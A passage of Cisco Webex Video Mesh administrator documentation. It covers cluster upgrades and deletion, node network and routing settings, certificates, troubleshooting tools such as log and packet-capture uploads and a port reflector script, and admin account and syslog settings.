| 5 | Click Move Node. Your node moves to the new cluster. |

### Set Video Mesh Cluster Upgrade Schedule

You can set a specific upgrade schedule or use the default schedule of 3 a.m. Daily United States: America/Los Angeles. You can choose to postpone an upcoming upgrade, if necessary.

Software upgrades for Video Mesh are done automatically at the cluster level, which ensures that all nodes are always running the same software version. Upgrades are done according to the upgrade schedule for the cluster. When a software upgrade becomes available, you can manually upgrade the cluster before the scheduled upgrade time.

Before you begin

Urgent upgrades are applied as soon as they are available.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid, and then click View all on the Video Mesh card. |
| --- | --- |
| 2 | Click a media resource and then click Edit cluster settings. |
| 3 | On the Settings page, scroll to Upgrade, and then choose the time, frequency, and time zone for the upgrade schedule.   Upgrades may take longer than a few minutes if the Video Mesh node is waiting for active calls to end. For a more immediate upgrade process, we recommend that you schedule the automatic upgrade window outside of your regular business hours. |
| 4 | (Optional) If needed, click Postpone to defer the upgrade one time, until the subsequent window.  Under the time zone, the next available upgrade date and time are displayed. |

**Upgrade Behavior**

1. The node makes periodic requests to the cloud to see if an update is available.
2. The cloud does not make the upgrade available until the cluster's upgrade window arrives. When the upgrade window arrives, the node's next periodic update request to the cloud delivers the update information.
3. The node pulls updates over a secure channel.
4. Existing services gracefully shut down to stop incoming calls routing to the node. The graceful shutdown also gives existing calls time to complete (up to 2 hours).
5. The upgrade installs.
6. The cloud only triggers the upgrade for a percentage of nodes in a cluster at a time.

### Delete Video Mesh Cluster

You can permanently delete a Video Mesh cluster from the Webex cloud. To complete this procedure, you must either move each node to a different cluster or deregister all the nodes. Deregistering all nodes in a cluster permanently removes them and makes them unavailable for use. The only way to make deregistered nodes available again is to reregister them.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid, and then click View all. |
| --- | --- |
| 2 | From the list of resources, scroll to the Video Mesh resource that you want to delete, and then click Edit Cluster Settings.   You can click Video Mesh to filter on just Video Mesh resources. |
| 3 | Click Delete Cluster, and then choose one:   * Click Move All Nodes. For each node, either   create a new resource by choosing an existing resource from the drop-down   list or entering a new name, and then click   Continue. * Click Deregister All Nodes, check the check box,   and then click Delete Cluster. |

### Deactivate Video Mesh

Deactivating Video Mesh removes the ability to have media remain on-premises for your meetings. Also, all in-progress meetings using Video Mesh nodes end and future meetings are hosted in the cloud. Once deactivated, the only way to use Video Mesh is to deploy it from the beginning.

Before you begin

Before you deactivate Video Mesh, you will deregister all Video Mesh nodes.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid > View All, choose Settings on the Video Mesh card. |
| --- | --- |
| 2 | Click **Deactivate**. |
| 3 | Review the list of clusters and read the disclaimer in the dialog. |
| 4 | Check the check box to confirm that you understand this action, and click Deactivate on the dialog. |
| 5 | When you are ready to deactivate your Video Mesh, click Deactivate Service.  Deactivation removes all Video Mesh nodes and clusters. Video Mesh is no longer configured. |

### Troubleshoot Video Mesh Node Registration

This section contains possible errors you may encounter during registration of your Video Mesh node to the Webex cloud and suggested steps to correct them.

#### The domain could not be resolved

This message appears if the DNS settings configured on your Video Mesh node are not correct.

Sign in to the console of your Video Mesh node and make sure the DNS settings are correct.

#### Could not connect to site using port 443 via SSL

This message appears if your Video Mesh node cannot connect to the Webex cloud.

Make sure your network allows connectivity on the ports required for Video Mesh. For details, see [Ports and Protocols Used by Video Mesh](#reference_931D7E96CA43B51A44E9A01B14BEB0F4).

#### Configuring tests using ThousandEyes

##### Network Test – Agent-to-Agent

The agent-to-agent network test allows users of ThousandEyes to have ThousandEyes agents at both ends of a monitored path, enabling testing of the path in either or both of two directions: source to target or target to source. For detailed information on how to configure an agent-to-agent test, see [Agent-to-Agent Test Overview](https://docs.thousandeyes.com/product-documentation/internet-and-wan-monitoring/tests/network-tests/agent-to-agent-test-overview).

A sample test creation dialog is shown below.

##### SIP Server Test

SIP server tests facilitate network measurements, BGP data collection and, most importantly, SIP service availability and performance testing against SIP-based VoIP infrastructure.

For detailed information on how to configure a SIP Server test, see [SIP Server Test Settings](https://docs.thousandeyes.com/product-documentation/internet-and-wan-monitoring/tests/voice-tests/sip-server-test-settings).

A sample test creation dialog is shown below.

##### RTP Stream Test

An RTP Stream test creates a simulated voice data stream between two ThousandEyes agents acting as the VoIP user agents. RTP packets are sent between one or more agents and a target agent, using UDP as the transport protocol, to obtain Mean Opinion Score (MOS), packet loss, discards, latency, and Packet Delay Variation (PDV) metrics. Metrics produced are one-way metrics (source to target). The RTP Stream test provides server port, call duration, de-jitter buffer size and codec configuration options.

For detailed information on configuring an RTP Stream Test, see [RTP Stream Test Settings](https://docs.thousandeyes.com/product-documentation/internet-and-wan-monitoring/tests/voice-tests/rtp-stream-test-settings).

A sample test creation dialog is shown below.

##### Webex HTTP Server URL Test

This test monitors the primary landing page that your users connect to when they access Webex. A sample test creation dialog is shown below.

##### Authoritative Webex DNS Server Test

This test is used to ensure that your Webex domain is properly resolving both internally and externally. When using Enterprise Agents, update the **DNS Servers** field to use your internal name servers. If you use Cloud Agents for external visibility, use the **Lookup Servers** button to auto-populate the authoritative external name servers. This example shows Cloud Agents resolving cisco.webex.com. You will need to update it to your organization's domain.

A sample test creation dialog is shown below.

### Manage Video Mesh Node From the Web Interface

Before you can make any network changes to Video Mesh nodes that are registered to the cloud, you must use Control Hub to put them in maintenance mode. For more information and a procedure to follow, see [Move a Node Into Maintenance Mode](https://help.webex.com/article/nxep7tb).

Maintenance mode is intended solely to prepare a node for shutdown or reboot so that you can make certain networking setting changes (DNS, IP, FQDN) or prepare for hardware maintenance such as replace RAM, hard drive, and so on.

Upgrades do not happen when a node is placed in maintenance mode.

When you place a node into maintenance mode, it does a graceful shutdown of calling services (stops accepting new calls and waits up to 2 hours for existing calls to complete). The purpose of the graceful shutdown of calling services is to allow reboot or shutdown of the node without causing dropped calls.

#### How to access the Video Mesh overview

You can open the web interface in either of these ways:

* If you are a Full Administrator and you already registered the node to the cloud, you can access the node from Control Hub.

  From the customer view in <https://admin.webex.com>, go to Services > Hybrid. Under Resources on the Video Mesh card, click View all. Click on the cluster, and then click on the node that you want to access. Click Go to Node.

  Only a Full Administrator for your Webex organization can use this feature. Other administrators, including Partner and External Full Administrators, don't have the Go To Node option for the Video Mesh resources.
* In a browser tab, navigate to `<IP address>/setup`, for example, `https://192.0.2.0/setup`. Enter the admin credentials that you set up for the node, and then click Sign In.

  If the admin account has been disabled, this method is not available. See the "Disable or Re-enable the Local Admin Account from Web Interface" section.

The overview is the default page and has the following information:

* **Call Status**—Provides the number of ongoing calls through the node.
* **Node Details**—Provides the node type, software image, software version, OS version, QoS status, and maintenance mode status.
* **Node Health**—Provides usage data (CPU, memory, disk), and service status (Management Service, Messaging Service, NTP Sync).
* **Network Settings**—Provides network information: hostname, interface, IP, gateway, DNS, NTP, and whether dual IP is enabled.
* **Registration Details**—Provides registration status, organization name, org ID, cluster the node is a part of, and cluster ID.
* **Cloud Connectivity**—Runs a series of tests from the node to the Webex cloud and third party destinations that the node needs to access to run properly.

  + Three types of tests are run: DNS resolution, server response time, and bandwidth.

    - DNS tests validate that the node can resolve a particular domain. These tests report as failed if the server does not respond within 10 seconds. They show as "Passed" with an orange "warning color" if the response time is between 1.5 and 10 seconds. The periodic DNS checks on the node generate alarms if the DNS response time is longer than 1.5 seconds.
    - Connect tests validate that the node can connect to a particular HTTPS URL and receive a response (responses other than proxy or gateway errors are accepted as evidence of connection).
    - The list of tests run from the overview page are not exhaustive and do not include websocket tests.
    - The node sends alarms if the calling processes cannot complete websocket connections to the cloud or connect to call-related services.
  + A Pass or Fail result appears next to each test; you can hover over this text to see more information about what was checked when the test ran.

As shown in the screenshot that follows, alarm notifications can also appear in the side panel, if any alarms were generated by the node. These notifications identify potential issues on the node and make suggestions for how you can troubleshoot or resolve these issues. If no alarms were generated, the notification panel does not appear.

***Example of the Overview Page in the Video Mesh Node Web Interface***

#### Configure Network Settings From Video Mesh Node Web Interface

If your network topology changes, you can use the web interface for each Webex Video Mesh node and change the network settings there. You may see a caution about changing the network settings, but you can still save the changes in case you're making changes to your network after changing Webex Video Mesh node settings.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Network.  The current network settings for the node appear. |
| 3 | Change the following settings for Host and Network Configuration  as needed:   * Under Edit Hostname and Domain, change the Hostname and Domain values. An error is displayed if the FQDN (hostname and domain) does not have the correct format. * Under Network Mode, Enable DHCP is listed, but DHCP is not supported. You must set a static IP address, subnet mask, and gateway. * Under Edit Network Configuration, change the IP Address (for the internal interface), Subnet Mask, and Gateway(a network node that serves as an access point to another network) values. The Video Mesh Node must have an internal IP address and resolvable DNS name. The node IP address must not belong to the IP address range reserved for Video Mesh Node internal use. The default reserved IP address range is 172.17.42.0–172.17.42.63, which can be configured later in the **Diagnostic** menu in the node console. This IP address range is for communication within the Video Mesh Node and between the software containers which hold the different components of the node—for example, SIP interface and media transcoding. * Under Edit DNS Servers, change the DNS server entries, which handle translating domain names to numeric IP addresses. You can enter up to 4 DNS servers. |
| 4 | Click Save Host and Network Configuration, and after the popup appears that says the node needs to reboot, click Save and Reboot.  During the save, all fields are validated on the server side. Warnings that appear generally indicate that the server isn't reachable or a valid response wasn't returned when queried—for example, if the FQDN is not resolvable using the DNS server addresses provided. You may choose to save by ignoring the warning but calls will not work until the FQDN can resolve to the DNS configured on the node. Another possible error state is if the gateway address is not in the same subnet as the IP address. After the Video Mesh Node reboots, the network configuration changes take effect. |
| 5 | Change the following settings for NTP Servers as needed:   * Under Edit NTP Servers, change the values for the NTP server entries, which are used in your organization to synchronize time to the node. |
| 6 | Click Save NTP Servers.   If you configure more than one NTP servers, the poll interval for failover is 40 seconds.    If the NTP server is an FQDN and that isn’t resolvable, a warning is returned. If the NTP server FQDN is resolved but the resolved IP can't be queried for NTP time, a warning is returned. |

#### Set The External Network Interface From The Video Mesh Node Web Interface

If your network topology changes, you can use the web interface for each Webex Video Mesh node and change the network settings there. You may see a caution about changing the network settings. However, you can still save the changes in case you're making changes to your network after changing Webex Video Mesh node settings.

You can configure the external network interface if you're deploying the Video Mesh Node in your network's DMZ so that you can isolate the enterprise (internal) traffic from the outside (external) traffic.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Network.  The current network settings for the node appear. |
| 3 | Click Advanced. |
| 4 | Toggle on Enable External Network and then click Ok  to enable the external IP address options on the node. |
| 5 | Enter the External IP Address, External Subnet Mask, and External Gateway values. |
| 6 | Click Save External Network Configuration. |
| 7 | Click Save and Reboot to confirm the change.  The node reboots to enable the dual IP address, and then automatically configures the basic static routing rules. These rules determine that traffic to and from a private class IP address uses an internal interface; traffic to and from a public class IP address uses an external interface. Later, you can create your own routing rules—For example, if you need to configure an override and allow access to an external domain from the internal interface. |
| 8 | If there are errors, click Ok  to close the error dialog box, fix the errors, and click Save External Network Configuration again. |

What to do next

To validate the internal and external IP address configuration, do the steps in [Run a Ping from Video Mesh Node Web Interface](#id_116212).

* Test an external destination (example, cisco.com); if successful, the results show that the destination was accessed from the external interface.
* Test an internal IP address; if successful, the results show that the address was accessed from the internal interface.
#### Add Internal and External Routing Rules From Video Mesh Node Web Interface

In a dual network interface (NIC) deployment, you can fine tune the routing for Video Mesh nodes by adding user-defined route rules for external and internal interfaces. The default routes are added to the nodes, but you can make exceptions—for example, external subnets or host addresses that need to be accessed through the internal interface, or internal subnets or host addresses that need to be accessed from the external interface. Perform the following steps as needed.

Before you begin

To configure routing rules, you must first enable and configure the external network interface.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Network.  The current network settings for the node appear. If you have configured the external network, the Routing Rules tab appears. |
| 3 | Click the Routing Rules tab.  The first time you open this page, the default system routing rules appear in the list. By default, all internal traffic goes through the internal interface and external traffic through the external interface.  You can add manual overrides to these rules in the next steps. |
| 4 | To add a rule, click Add Routing Rule, then choose one of the following option:.   * For Network Type, click Internal, and then enter the external subnet or host IP address to use for the internal route. * For Network Type, click External, and then enter the internal subnet or host IP address to use for the external route. |
| 5 | Click Add Routing Rule.  As you add each rule, they appear in the routing rule list, categorized as user defined rules. |
| 6 | To delete one or more user-defined rules, check the check box in the column to the left of the rules and then click Delete Routing Rule(s).   The default routes cannot be deleted, but you can delete any user-defined overrides that you configured. |

Custom routing rules may create potential for conflicts with other routing. For example, you may define a rule that freezes your SSH connection to the Video Mesh Node interface. If this happens, do one of the following and then remove or modify the routing rule:

* Open an SSH connection to the public IP address of the Video Mesh Node.
* Access the Video Mesh Node through the ESXi console

#### Configure Container Network From Video Mesh Node Web Interface

Video Mesh node reserves a subnet range for internal use within the node. The default range is 172.17.42.0–172.17.42.63. The nodes do not respond to any external-to-Video Mesh node traffic originating from this range. You may want to use the node console to change the container bridge IP address to avoid conflicts with other devices in your network.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Network.  The current network settings for the node appear. |
| 3 | Click Advanced. |
| 4 | Change the values for Container IP Address and Container Subnet Mask, as needed, and then click Save Container Network Configuration. |
| 5 | Click Save and Reboot to confirm the change. |
| 6 | If there are errors, click Ok  to close the error dialog box, fix the errors, and click Save Container Network Configuration again. |

#### Set the Network Interface MTU Sizes

All Webex Video Mesh nodes have path MTU (PMTU) discovery enabled by default. With PMTU, the node can detect MTU issues and adjust the MTU size automatically. When PMTU fails because of firewall or network issues, the node can have connectivity issues to the cloud because packets larger than the MTU drop. Manually setting a lower MTU size can fix this issue.

Before you begin

If you've already registered the node, you must put the node in maintenance mode before you can change the MTU settings.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Network.  The current network settings for the node appear. |
| 3 | Click Advanced. |
| 4 | In the Interface MTU Settings section, enter an MTU value between 1280 and 9000 bytes in the applicable field(s).  If you have enabled the external interface, you can set both the internal and external interface MTU sizes separately. |

The node reboots to apply the MTU changes.

What to do next

If you put the node in maintenance mode to change the MTU, turn off maintenance mode.

#### Enable or Disable DNS Caching

If DNS responses to your Video Mesh nodes regularly take more than 750 ms, or if the
Cisco TAC recommends it, you can enable DNS caching. With DNS caching on, the node
caches DNS responses locally. With the cache, requests are less prone to delay or
timeouts that can lead to connectivity alarms, call drops, or call quality issues.
DNS caching can also reduce the load on your DNS infrastructure.

Before you begin

Move the node to [maintenance mode](https://help.webex.com/nxep7tb/). When the maintenance mode status is
On (active calls have completed or have dropped at the
end of the pending period), you can enable or disable DNS caching.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Network.  The current network settings for the node appear. |
| 3 | Click Advanced. |
| 4 | In the DNS Caching Configuration section, toggle Enable DNS Caching on or off. |
| 5 | In the confirmation dialog, click Save and Reboot. |
| 6 | After the node reboots, reopen the Webex Video Mesh node interface and confirm that the connectivity checks are succeeding on the Overview page. |

When you enable DNS caching, the DNS Cache Statistics displays
the following statistics:

| Statistic | Description |
| --- | --- |
| Cache Entries | The number of previous DNS resolutions that the DNS Cache server has stored |
| Cache Hits | The number of times since the cache reset that the cache handled a DNS request from Video Mesh, without querying the customer DNS server |
| Cache Misses | The number of times since the cache reset that the customer DNS server handled a DNS request from Video Mesh rather than through the cache |
| Cache Hit Percent | The percent of DNS requests from Video Mesh that the cache handled without querying the customer DNS server |
| Cache Server Outbound DNS queries | The number of DNS queries that the Video Mesh DNS cache server made against the customer DNS servers |
| Cache Server Inbound DNS queries | The number of DNS queries that Video Mesh made against its internal DNS Cache server |
| Outbound to Inbound Query Ratio | The ratio of DNS queries made by Video Mesh against the customer DNS server to the queries made by Video Mesh against its internal DNS Cache server |
| Inbound Queries Per Second | The average number of DNS queries per second that Video Mesh made against its internal DNS Cache server |
| Outbound Queries Per Second | The average number of DNS queries per second that Video Mesh made against the customer DNS servers |
| Outbound DNS Latency [time range] | The percent of DNS queries that Video Mesh made against the customer DNS servers where the response time fell into the described time range |

Use the Wipe DNS Cache button to reset the DNS cache when TAC
requests. After wiping the DNS cache, you see a higher Outbound to
Inbound Query Ratio as the cache replenishes. You don't need to
place the node in maintenance mode to wipe the cache.

What to do next

Move the node out of maintenance mode. Then repeat the task on any other nodes that require a change.

#### Upload Security Certificates

Set up a trust relationship between the node and an external server, such as a syslog
server.

In a clustered environment, you must install CA and server certificates on each node individually.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | When setting up TLS with another server, such as a [syslog server](#Cisco_Task_in_List_GUI.dita_864f0ca7-ba0b-49fe-b980-d4dc4b1240d9), we **recommend** for security reasons that you use a CA signed certificate on your Video Mesh nodes instead of the node's default self-signed certificate. To create and upload the certificate and key pairs on the Video Mesh node, go to Server Certificates, and follow these steps:   1. If you need a certificate issued from a certified    provider, click Create a Certificate Signing    Request. Fill out the required information (including    the Subject Alternative Name(s), which are FQDNs    that must contain the common name). Then, generate and download the CSR    to submit the request to the provider. You can create multiple CSRs. The    provider returns the certificate authority (CA) signed certificate. (The    CSR creation step already generated the private key.)      The common name is not a URL. It doesn’t include any protocol    (e.g. http:// or https://), port number, or pathname. The    `commonName` field in the X.509 certificate    specification technically represents the common name. For    `https://www.example.com`, the correct value    is `example.com`. 2. When you have the certificate and key, click Upload a Server    Certificate (.crt or .pem file), choose the certificate    file, then click Upload a Private Key (.key file)    and enter a passphrase if you have one.  The private key is already in place when a CSR is generated. You only    need to upload a private key if you do not use the CSR creation    step. 3. After you get the certificate, go to the first Video Mesh node in a    cluster, click Install Server Certificate, read    the prompt, click Install, then click    OK.  A Video Mesh node that's registered to the cloud waits up to 2 hours    for any calls to end and puts itself into a temporary inactive state    (quiesces). Once either the existing calls finish or 2 hours pass    (whichever comes first), this node completes the certificate    installation. A prompt appears when the server certificate    installation completes, and you can then reload the page to view the    new certificate and key entry. 4. Click Download next to the certificate and key    files to save a local copy.  Save the files somewhere that's easy to remember and leave the    instance open in the browser tab. 5. Go to the second Video Mesh node in the cluster, fill in the    passphrase, and then upload the private key file. Then click    Upload a Server Certificate and then choose    Install Server Certificate, read the prompt,    click Install, then click    OK. 6. Repeat these steps on every other Video Mesh node in the same    cluster. |
| 3 | Choose an option depending on how the external server's CA certificate is signed:   * If the server's CA certificate is signed by a generally recognized   organization, such as DigiCert, GeoTrust, or GlobalSign, the Video Mesh node   will trust it based on the list of root certificates from the Video Mesh   node's host OS, which are updated periodically. Skip to Step [6](#Repeat-Step). * If the server's CA certificate is signed by an internal enterprise CA root certificate, the root certificate from that authority must be added to the Video Mesh node. Continue with the next step. |
| 4 | Get the certificate or certificate trust list (CTL) that the external server uses.  As with the Video Mesh node certificate, save the external server file somewhere that's easy to remember. |
| 5 | Go back to the Webex Video Mesh node interface tab, click Trust Store & Proxy, then choose an option:   * To install a single CA certificate, click Upload a Root Certificate or End Entity Certificate (.crt or .pem file), and then choose the certificate file from your computer, click Install All Certificates into the Trust Store, read the prompt, click Install, and then reboot the node. * To install a certificate chain, upload the root CA certificate and intermediate CA certificate, and then click Install All Certificates into the Trust Store, read the prompt, and then click Install.   A Video Mesh node that's registered to the cloud waits up to 2 hours for any calls to end and puts itself into a temporary inactive state (quiesces). To install the certificate, the node must reboot and does so automatically. When it comes back online, a prompt appears when the certificate is installed on the Video Mesh node, and you can then reload the page to view the new certificate. |
| 6 | Repeat the certificate or certificate chain upload on every other Video Mesh node in the same cluster. |

#### Generate Video Mesh Logs for Support

You may be instructed to send logs directly to Cisco, or you can download them yourself to attach to a case. Use this procedure from the web interface to generate logs and send them to Cisco or download them from any Video Mesh nodes. The generated log package contains media logs, system logs, and container logs. The bundle provides useful information for connectivity to Webex, platform issues, and call setup or media, so that Cisco can troubleshoot your Video Mesh node deployment for you.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting, and then choose an option next to Send Logs:   * Click Send Logs to Cisco to generate a log bundle from the node and send the bundle directly to Cisco in one step. You'll see a status indicator that changes as the logs are compressed, zipped, and uploaded. * Click Download to generate a long bundle from the node that you can save locally or attach to a case later.   Generated logs are historically stored on the node and remain on the node even after reboots. An upload identifier shows on the page. Support uses this value to identify your uploaded logs. |
| 3 | When you [open a case or interact with the Cisco TAC](https://mycase.cloudapps.cisco.com/case), include the upload identifier value so that your support engineer can access the logs.  If you submitted the log to Cisco directly, you don't need to upload the log bundle to the TAC case. |

What to do next

While logs are uploading to Cisco or being downloaded, you can run a packet capture from the same screen.

#### Generate Video Mesh Packet Captures for Support

You can run a packet capture (PCAP) and submit it to Cisco for further analysis. A packet capture takes a snapshot of data packets that go through the node's network interfaces. After packets are captured and submitted, Cisco can analyze the submitted capture and help with troubleshooting your Video Mesh node deployment.

Before you begin

The packet capture functionality is intended for debugging purposes only. If you run a packet capture on a live Video Mesh node that is hosting active calls, the packet capture may affect the performance of the node and the generated file might be overwritten. This causes a loss of captured data. We recommend that you run the packet capture only during off peak hours or when the call count is less than 3 on the node.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting.  You can start the packet capture and upload logs at the same time. |
| 3 | (Optional) In the Packet Capture section, you can limit the capture to packets on a specific interface, filter by packets to or from specific hosts, or filter by packets on one or more ports. |
| 4 | To begin the process, toggle on the Start Packet Capture setting. |
| 5 | When you are done, toggle off the Start Packet Capture setting. |
| 6 | Choose one:   * Click Send PCAP to Cisco to send the packet capture from the node directly to Cisco. You'll see a status indicator that changes as the packet capture is uploaded. * Click Download to save a local copy of the packet capture from the node. You can attach it to a case later.   After a package capture is uploaded, an upload identifier shows on the page. Support uses this value to identify your uploaded packet capture. The maximum size for packet captures is 2 GB. |
| 7 | When you [open a case or interact with the Cisco TAC](https://mycase.cloudapps.cisco.com/case), include the upload identifier value so that your support engineer can access the packet capture. |

#### Run a Ping from Video Mesh Node Web Interface

You can run a ping from the Video Mesh node web interface. This step tests a destination you enter and sees if the Video Mesh node can reach it.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting, scroll to Ping, and then enter a destination address that you want to test in the FQDN or IP Address field under Test Connectivity Using Ping. |
| 3 | Click Ping.  The test runs and you'll see a ping success or failure message. The test does not have a timeout limit. If you receive a failure or the test runs indefinitely, check the destination value that you entered and your network settings. |

#### Run a Trace Route from Video Mesh Web Interface

You can run a traceroute from the Video Mesh node web interface. This step shows the route taken by packets from the node towards the destination that you enter. Viewing the traceroute information helps you determine why a particular connection might be poor and can help you identify problems.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting, scroll to Traceroute, and then enter a destination address that you want to test in the FQDN or IP Address field under Trace Route to Host.  The test runs and you'll see trace route success or failure message. The test times out at 16 seconds. If you receive a failure or the test times out, check the destination value that you entered and your network settings. |

#### Check NTP Server from Video Mesh Node Web Interface

You can enter a FQDN or IP address of a network time protocol (NTP) server to confirm that the Video Mesh node can access the server. This test is helpful if you notice time synchronization issues and want to rule out the reachability of the NTP server.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting, scroll to Check NTP Server, and then enter a destination address that you want to test in the FQDN or IP Address field under View SNTP Query Response.  The test runs and you'll see a query success or failure message. The test does not have a timeout limit. If you receive a failure or the test runs indefinitely, check the destination value that you entered and your network settings. |

#### Identify Port Issues With Reflector Tool in the Web Interface

The reflector tool (a combination of a server on the Video Mesh node and client through a Python script) is used to verify whether the required TCP/UDP ports are open from Video Mesh nodes.

Before you begin

* Download a copy of the Reflector Tool Client (a Python script) from <https://github.com/CiscoDevNet/webex-video-mesh-reflector-client>.
* For the script to work properly, ensure that you're running Python 2.7.10 or later in your environment.
* Currently, this tool supports SIP endpoints to Video Mesh nodes and intracluster verification.

| 1 | From the customer view in <https://admin.webex.com>, enable maintenance node for the Video Mesh Node by following [these instructions](https://help.webex.com/article/nxep7tb). |
| --- | --- |
| 2 | Wait for the node to show a 'Ready for maintenance' status in Control Hub. |
| 3 | Open the Webex Video Mesh node interface.  For instructions, see [Manage Video Mesh Node From the Web Interface](#id_107185). |
| 4 | Scroll to Reflector Tool, and then start either the TCP Reflector Server or UDP Reflector Server, depending on what protocol you want to use. |
| 5 | Click Start Reflector Server, and then wait for the server to start successfully.  You'll see a notice when the server starts. |
| 6 | From a system (such as a PC) on a network that you want Video Mesh nodes to reach, run the script with the following command:  ``` $ python <local_path_to_client_script>/reflectorClient.py --ip <ip address of the server> --protocol <tcp or udp> ```   At the end of the run, the client shows a success message if all the required ports are open:    The client shows a failed message if any required ports are not open: |
| 7 | Resolve any port issues on the firewall and then rerun the above steps. |
| 8 | Run the client with `--help` to get more details. |

#### Enable Debug User Account From Video Mesh Node Web Interface

If Cisco TAC requires access to the Webex Video Mesh node, you can temporarily enable a debug user account so that support can run further troubleshooting.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting, and then toggle on the Enable Debug User setting.  An encrypted passphrase appears that you can provide to Cisco TAC. |
| 3 | Copy the passphrase, paste it in the support ticket or directly to the support engineer, and then click OK when you have it saved. |

The debug user account is valid for 3 days, after which it expires.

What to do next

You can disable the account before it expires if you return to the Troubleshooting page and then toggle off the Enable Debug User setting.

#### Factory Reset a Video Mesh Node From The Web Interface

As part of deregistration cleanup, you can factory reset the Video Mesh node from the web interface. This step removes any configuration you put in place while the node was active but does not remove the virtual machine entry. Later, you may want to reregister this node as part of another cluster that you build from scratch.

Before you begin

You must use Control Hub to deregister the Video Mesh node from the cluster that's registered in Control Hub.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Troubleshooting, scroll to Factory Reset, and then click Reset Node. |
| 3 | Ensure that you understand the information in the warning prompt that appears, and then click Reset and Reboot.  The node reboots automatically after the factory reset. |

#### Disable or Re-enable the Local Admin Account From Web Interface

When you install a Webex Video Mesh node, you initially sign in using a built-in local account with the user name "admin." Once you register the node to the Webex cloud, you can use your Webex organization administration credentials to manage your Video Mesh nodes from Control Hub. This way, the administrator account policy and management processes that apply to Control Hub also apply to your Video Mesh nodes. For further control, you can disable the built-in "admin" account so that Control Hub handles all administrator authentication and management.

Use these steps after you have registered the node to the cloud to disable (or later re-enable) the admin user account. When you disable the admin account, you must use Control Hub to access the node web interface.

Only a Full Administrator for your Webex organization can use this feature. Other
administrators, including Partner and External Full Administrators, don't have
the Go To Node option for the Video Mesh resources.

| 1 | From the customer view in <https://admin.webex.com>, go to Services > Hybrid. |
| --- | --- |
| 2 | Under **Resources** on the Video Mesh card, click **View all**. |
| 3 | Click on the cluster and then click on the node that you want to access. Click **Go to Node**. |
| 4 | Go to **Administration**. |
| 5 | Toggle the **Enable Admin User Sign In** switch off to disable the account, or on to re-enable it.   You can't disable the admin account until you've registered the node to the cloud. |
| 6 | On the confirmation screen, click **Disable** or **Enable** to complete the change. |

Once you disable the admin user, you can't sign in to the Video Mesh node through the
WebUI or the CLI launched from SSH. However, you can sign in using the admin user
credentials through a CLI launched from the VMware ESXi console.

#### Change Admin Passphrase From Web Interface

Use this procedure to change the administrator passphrase (password) for your Webex Video Mesh node by using the web interface.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Administration, and next to Change Passphrase, click Change. |
| 3 | Enter the Current Passphrase, and then enter a new passphrase value in both New Passphrase and Confirm New Passphrase. |
| 4 | Click Save Passphrase.  A "password changed" message appears and then you go back to the sign in screen. |
| 5 | Sign in using your new admin login and passphrase (password). |

#### Change Passphrase Expiry Interval From the Web Interface

Use this procedure to change the default passphrase expiry interval of 90 days by using the web interface. When the interval is up, you are prompted to enter a new passphrase when you sign into the Video Mesh node.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to Administration, and next to Change Passphrase Expiry, enter a new value for Expiry Interval (Days) (up to 365 days), and then click Save Passphrase Expiry Interval.  A success screen appears, and you can then click OK to finish. |

The Administration page also shows dates for the last passphrase change and the next time the password expires.

#### Set External Logging to a Syslog Server

If you have a syslog server, you can set your Webex Video Mesh node to log to the external server audit trail information, such as:

* Details on administrator sign-ins
* Configuration changes (including turning maintenance mode on or off)
* Software updates

The node aggregates the logs, if any, and sends them to the server every ten minutes.

| 1 | Open the Webex Video Mesh node interface. |
| --- | --- |
| 2 | Go to **Administration**. |
| 3 | Next to External Logging, toggle on **Enable External Logging**. |
| 4 | For **Syslog Server Details**, enter the host IP address or fully-qualified domain name and the syslog port.  If the server isn’t DNS-resolvable from the node, use an IP address in the **Host** field. |
| 5 | Choose the **Protocol**—UDP or TCP.  To use TLS encryption, choose **TCP** and then toggle on **Enable TLS**. Make sure that you also upload and install the security certificates required for TLS communication between the node and the syslog server. If no certificates are installed, the node defaults to using its self-signed certificates. For help, see [Upload Security Certificates](#Cisco_Task_in_List_GUI.dita_6036b20c-7623-4f0e-a6af-5ff9498be996). |
| 6 | Click **Save External Logging Configuration**. |

The properties of the log message follow this format: *Priority Timestamp Hostname Tag Message*.

| Property | Description |
| --- | --- |
| Priority | The value is always 131, based on the formula: Priority = (Facility Code \* 8) + Severity.  The facility code is 16 for "local0". The severity is 3 for "notice". |
| Timestamp | The timestamp format is "Mmm dd hh:mm:ss". |
| Hostname | The hostname for the Video Mesh node. |
| Tag | The value is always syslogAuditMsg. |
| Message | The message is a JSON string of at least 1KB. Its size depends on the number of aggregated events in the ten minute interval. |

Here is an example message:

```
{
  "events": [
    {
      "event": "{\hostname\": \"test-machine\", \"event_type\": \"login_success\",
       \"event_category\": \"node_events\", \"source\": \"mgmt\", \"session_data\":

    }
  ]
}
```
### Webhooks for Video Mesh alerts

Video Mesh supports Webhook alerts which enable organization admins to receive alerts on specific events. Admins can choose to be notified of events like call overflows and call redirects, minimizing the need to log in to Control Hub for monitoring their deployment. This is achieved by creating a webhook subscription where a target URL is provided by the admin, to which alerts will be sent. Using webhooks for alerts also allows monitoring of parameters without using the associated developer APIs.

The following event types can be monitored through webhooks:

